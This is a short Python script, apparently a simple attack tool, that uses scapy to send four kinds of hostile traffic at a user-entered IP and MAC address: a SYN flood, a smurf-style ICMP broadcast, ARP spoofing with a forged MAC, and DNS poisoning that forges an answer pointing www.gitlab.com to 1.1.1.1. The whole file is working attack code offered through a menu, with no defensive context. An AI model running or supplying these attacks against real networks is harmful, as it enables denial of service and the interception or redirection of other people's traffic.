from scapy.all import *

BROADCAST = "ff:ff:ff:ff:ff:ff"




def syn_flood():
    msg = Ether(dst=mac_address) / IP(dst=ip_address) / TCP()
    sendp(msg, count=20)


def smurf():
    msg = Ether(dst=BROADCAST) / IP(dst=ip_address) / ICMP()
    sendp(msg, count=20)


def dns_poisoning():
    msg = Ether(dst=mac_address) / IP(dst=ip_address) / UDP() / DNS(qd=DNSQR(qname="www.gitlab.com"), an=DNSRR(rrname="www.gitlab.com", rdata="1.1.1.1"))
    sendp(msg)


def arp_spoofing():
    msg = Ether(dst=mac_address) / ARP(op='is-at', pdst=ip_address, hwsrc="11:11:11:11:11:11")
    sendp(msg)

CHOICES = {1: syn_flood, 2: smurf, 3: arp_spoofing, 4: dns_poisoning}


def menu():
    print("1. SYN Flood")
    print("2. SMURF")
    print("3. ARP Spoofing")
    print("4. DNS Poisoning")


def main():
    global ip_address
    global mac_address
    print("Computer Details to attack:")
    ip_address = input("IP address: ")
    mac_address = input("MAC address: ")
    while True:
        menu()
        choice = int(input("Your choice: "))
        if choice == 1:
            syn_flood()
        elif choice == 2:
            smurf()
        elif choice == 3:
            arp_spoofing()
        elif choice == 4:
            dns_poisoning()



if __name__ == "__main__":
    main()
